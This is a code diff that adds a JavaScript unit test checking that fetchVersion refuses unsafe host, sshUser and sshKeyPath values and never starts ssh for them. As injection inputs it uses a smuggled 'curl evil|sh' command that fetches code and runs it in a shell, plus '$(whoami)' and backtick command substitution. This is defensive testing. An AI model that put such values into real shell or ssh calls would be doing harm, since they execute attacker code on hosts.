@@ -110,6 +110,21 @@ describe('openclaw-version (#296)', () => {
       assert.equal(called, false);
     });
 
+    it('unsafe host/sshUser/sshKeyPath → error and no ssh attempted (#314 injection guard)', () => {
+      let called = false;
+      ocv._internal.exec = () => { called = true; return ''; };
+      for (const [field, bad, re] of [
+        ['host', '10.0.0.1; curl evil|sh', /host/],
+        ['sshUser', 'a$(whoami)', /sshUser/],
+        ['sshKeyPath', '~/.ssh/k`id`', /sshKeyPath/]
+      ]) {
+        const r = ocv.fetchVersion(conn({ [field]: bad }));
+        assert.equal(r.version, null, `${field} should block`);
+        assert.match(r.error, re);
+      }
+      assert.equal(called, false, 'no ssh runs for an unsafe-shaped target');
+    });
+
     it('ssh failure → surfaces an error, no crash', () => {
       ocv._internal.exec = () => { const e = new Error('boom'); e.stderr = 'conn refused'; throw e; };
       const r = ocv.fetchVersion(conn());
